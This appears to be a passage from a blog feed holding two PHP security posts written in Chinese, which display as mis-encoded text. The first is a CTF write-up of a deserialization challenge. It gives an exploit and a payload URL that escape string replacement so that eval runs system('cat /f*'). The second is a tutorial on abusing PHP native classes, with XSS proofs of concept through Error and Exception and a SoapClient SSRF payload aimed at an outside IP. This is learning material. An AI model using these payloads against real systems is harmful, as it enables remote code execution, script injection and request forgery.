class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// Thinking how to use sing?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jump</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pwd</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$root</span>, <span class="hljs-variable">$pwd</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;root = <span class="hljs-variable">$root</span>;<br><span class="hljs-variable language_">$this</span>-&gt;pwd = <span class="hljs-variable">$pwd</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;root);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;pwd);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hehe!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sw</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ikun&#x27;</span>, <span class="hljs-string">&#x27;kk&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>&#125; <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;B&#x27;</span>];<br>    <span class="hljs-variable">$rap</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">jump</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$baskerball</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$rap</span>);<br>    <span class="hljs-variable">$success</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">sw</span>(<span class="hljs-variable">$baskerball</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$success</span>;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>æˆ‘ä»¬æœ€ç»ˆè¦åˆ©ç”¨evalå‘½ä»¤æ‰§è¡Œ</p><p>ikunä¼šè¢«æ›¿æ¢æˆkkï¼Œä¹Ÿå°±æ˜¯è¯´æ¯å››ä¸ªå­—ç¬¦ä¼šé€ƒé€¸ä¸¤ä¸ª</p><p>è€Œæˆ‘ä»¬éœ€è¦é€ƒé€¸  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-built_in">pwd</span><span class="hljs-string">&quot;;s:xx:&quot;</span><br></code></pre></td></tr></table></figure><p>éœ€è¦18&#x2F;2ä¸ªikun</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x=<span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sing</span>(<span class="hljs-string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">seeeeer.php?A=ikunikunikunikunikunikunikunikunikun&amp;B=<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">pwd</span><span class="hljs-string">&quot;;O:4:&quot;</span>sing<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>x<span class="hljs-string">&quot;;s:18:&quot;</span><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215191845070.png" alt="image-20231215191845070"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¤©å‘½ä¹‹å­&quot;&gt;&lt;a href=&quot;#å¤©å‘½ä¹‹å­&quot; class=&quot;headerlink&quot; title=&quot;å¤©å‘½ä¹‹å­&quot;&gt;&lt;/a&gt;å¤©å‘½ä¹‹å­&lt;/h1&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>phpåŸç”Ÿç±»</title>
    <link href="http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2023-12-15T09:24:45.000Z</published>
    <updated>2023-12-15T09:27:05.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ–°ç”Ÿèµ›é‡åˆ°äº†ä¸€é“é¢˜éœ€è¦åˆ©ç”¨PHPåŸç”Ÿç±»ï¼Œç”±äºè‡ªå·±å¾ˆèœï¼ŒèŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ã€‚è¶å‘¨æœ«æœ‰æ—¶é—´æ€»ç»“ä¸€ä¸‹å¸¸è§çš„PHPåŸç”Ÿç±»</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>Directorylterator</li><li>SimpleXMLElement</li></ul><h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h1><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><ul><li>é€‚ç”¨äºphp7</li><li>å¼€å¯æŠ¥é”™</li></ul><h3 id="Errorç±»"><a href="#Errorç±»" class="headerlink" title="Errorç±»"></a>Errorç±»</h3><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> &#123;<br>    <span class="hljs-comment">/* å±æ€§ */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br> <br></code></pre></td></tr></table></figure><p><strong>ç±»å±æ€§</strong></p><ul><li>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</li><li>codeï¼šé”™è¯¯ä»£ç </li><li>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</li><li>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</li></ul><p><strong>ç±»æ–¹æ³•</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> â€” åˆå§‹åŒ– error å¯¹è±¡</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> â€” è·å–é”™è¯¯ä¿¡æ¯</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> â€” è¿”å›å…ˆå‰çš„ Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> â€” è·å–é”™è¯¯ä»£ç </li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„æ–‡ä»¶</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„è¡Œå·</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> â€” è·å–è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²å½¢å¼çš„è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> â€” error çš„å­—ç¬¦ä¸²è¡¨è¾¾</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> â€” å…‹éš† error</li></ul><h3 id="ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss"><a href="#ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss" class="headerlink" title="ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss"></a>ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss</h3><p>Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªå®šä¹‰ä¸€ä¸ªErrorã€‚ç”±äºå®ƒå†…ç½®çš„__toString()æ–¹æ³•ï¼Œåœ¨php7ä¸‹å¯èƒ½é€ æˆxssï¼Œå¸¸ç”¨äºååºåˆ—åŒ–ä¸­ã€‚</p><p>å½“phpå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºæ—¶ï¼Œä¼šè§¦å‘__toStringæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153028854.png" alt="image-20231215153028854"></p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><ul><li>é€‚ç”¨äºphp5ã€7</li><li>å¼€å¯æŠ¥é”™</li></ul><h3 id="Exceptionç±»"><a href="#Exceptionç±»" class="headerlink" title="Exceptionç±»"></a>Exceptionç±»</h3><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span> &#123;<br>    <span class="hljs-comment">/* å±æ€§ */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»å±æ€§</strong></p><ul><li>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</li><li>codeï¼šé”™è¯¯ä»£ç </li><li>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</li><li>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</li></ul><p><strong>ç±»æ–¹æ³•</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> â€” å¼‚å¸¸æ„é€ å‡½æ•°</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> â€” è·å–å¼‚å¸¸ä»£ç </li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§°</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå·</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> â€” å¼‚å¸¸å…‹éš†</li></ul><h3 id="ä½¿ç”¨Exceptionç±»æ„é€ xss"><a href="#ä½¿ç”¨Exceptionç±»æ„é€ xss" class="headerlink" title="ä½¿ç”¨Exceptionç±»æ„é€ xss"></a>ä½¿ç”¨Exceptionç±»æ„é€ xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153244269.png" alt="image-20231215153244269"></p><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>SoapClinetæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®webæœåŠ¡çš„PHPå®¢æˆ·ç«¯</p><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">SoapClient &#123;<br>    /* æ–¹æ³• */<br>   <span class="hljs-keyword"> public</span> __construct ( string|null $wsdl ,<span class="hljs-built_in"> array </span>$options = [] )<br>   <span class="hljs-keyword"> public</span> __call ( string $name ,<span class="hljs-built_in"> array </span>$args )<span class="hljs-keyword"> :</span> mixed<br>   <span class="hljs-keyword"> public</span> __doRequest ( string $request , string $location , string $action ,<span class="hljs-built_in"> int </span>$version , bool $oneWay = false )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getCookies ( )<span class="hljs-keyword"> :</span><span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> public</span> __getFunctions ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __getLastRequest ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastRequestHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponse ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponseHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getTypes ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __setCookie ( string $name , string|null $value = null )<span class="hljs-keyword"> :</span> void<br>   <span class="hljs-keyword"> public</span> __setLocation ( string $location = <span class="hljs-string">&quot;&quot;</span> )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __setSoapHeaders ( SoapHeader|array|null $headers = null )<span class="hljs-keyword"> :</span> bool<br>   <span class="hljs-keyword"> public</span> __soapCall ( string $name ,<span class="hljs-built_in"> array </span>$args , array|null $options = null , SoapHeader|array|null $inputHeaders = null ,<span class="hljs-built_in"> array </span>&amp;$outputHeaders = null )<span class="hljs-keyword"> :</span> mixed<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“__callæ–¹æ³•è¢«è§¦å‘åï¼Œå¯ä»¥å‘é€httpå’Œhttpsè¯·æ±‚ã€‚</p><p>è¯¥ç±»æ„é€ å‡½æ•°å¦‚ä¸‹</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>ï¼Œ<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼</li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œè¯¥å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯å°†è¯·æ±‚å‘é€åˆ°SOAPæœåŠ¡å™¨çš„URLï¼Œuriåˆ™æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li></ul><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç”±äºç¯å¢ƒé—®é¢˜ï¼Œæ²¡æœ‰ç”¨ncæ¼”ç¤º</p><h1 id="Directorylterator"><a href="#Directorylterator" class="headerlink" 